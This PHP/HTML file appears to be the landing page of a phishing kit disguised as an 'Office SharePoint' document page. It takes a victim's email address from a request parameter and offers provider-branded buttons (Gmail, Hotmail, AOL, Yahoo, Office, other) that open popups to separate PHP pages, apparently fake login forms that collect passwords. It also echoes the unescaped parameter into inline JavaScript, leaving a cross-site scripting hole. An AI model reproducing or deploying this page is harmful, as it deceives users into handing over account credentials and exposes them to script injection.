<?php
$email = @$_REQUEST['X1'];

?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body, html {
  height: 100%;
  margin: 0;
}

.bg {
  /* The image used */
  background-image: url("images/bg.jpg");

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
.bg1 {  /* The image used */
  background-image: url("images/bg.jpg");

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
.bg11 {  background-image: url("images/bg.jpg");

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
.bg12 {  background-image: url("images/bg.jpg");

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
</style>
<title>Office SharePoint</title></head>
<link rel="shortcut icon" href="icon.ico">
<body>

<div class="bg">

<div 
    style="left:338px; width:963px; top:267px; position:absolute; height: 173px;"><a href="" onClick="window.open('001100110011gmail.php?X1=<?php echo $email ?>', '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');"><img src="nav/1.png"></a><a href="" onClick="window.open('001100110011hotmail.php?X1=<?php echo $email ?>', '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');"><img src="nav/2.png"></a><a href="" onClick="window.open('AOL.php?X1=<?php echo $email ?>', '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');"><img src="nav/3.png"></a><a href="" onClick="window.open('001100110011yahoo.php?X1=<?php echo $email ?>', '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');"><img src="nav/4.png"></a><a href="" onClick="window.open('001100110011office.php?X1=<?php echo $email ?>', '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');"><img src="nav/5.png"></a><a href="" onClick="window.open('001100110011other.php?X1=<?php echo $email ?>', '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');"><img src="nav/6.png"></a></div>
</div>


</span>
</body>
</html>
